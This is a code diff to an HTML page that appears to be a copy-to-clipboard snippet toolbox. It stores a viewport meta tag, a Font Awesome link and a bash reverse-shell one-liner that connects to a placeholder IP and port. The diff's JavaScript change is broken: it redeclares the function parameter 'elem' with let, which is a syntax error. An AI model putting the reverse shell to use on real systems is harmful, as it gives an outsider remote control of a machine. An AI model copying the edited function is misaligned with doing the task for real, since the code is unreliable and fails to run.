@@ -40,13 +40,13 @@
 					<div id="Popular" class="display_none">
 						<ul>
 							<li>
-								<input class="w-50" id="Meta" value="<meta name='viewport' content='width=device-width, initial-scale=1.0'>"><button onclick="CopyFrim(this)">Copy</button>
+								<input class="w-50" id="Meta" value="<meta name='viewport' content='width=device-width, initial-scale=1.0'>"><button onclick="CopyFrim('Meta')">Copy</button>
 							</li>
 							<li>
-								<input class="w-50" id="FontAvosome" value="<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.8.1/css/all.css' integrity='sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf' crossorigin='anonymous'"><button onclick="CopyFrim(this)">Copy</button>
+								<input class="w-50" id="FontAvosome" value="<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.8.1/css/all.css' integrity='sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf' crossorigin='anonymous'"><button onclick="CopyFrim('FontAvosome')">Copy</button>
 							</li>
 							<li>
-								<input class="w-50" id="revers" value="/bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'"><button onclick="CopyFrim(this)">Copy</button>
+								<input class="w-50" id="revers" value="/bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'"><button onclick="CopyFrim('revers')">Copy</button>
 							</li>
 						</ul>
 					</div>
@@ -73,6 +73,7 @@
 		}
 
 		function CopyFrim(elem) {
+			let elem = document.getElementById(elem);
 			let range = document.createRange();
 			range.selectNode(elem);
 	 		window.getSelection().addRange(range);
@@ -87,4 +88,5 @@
 	</script>
 </body>
 </html>
+
 
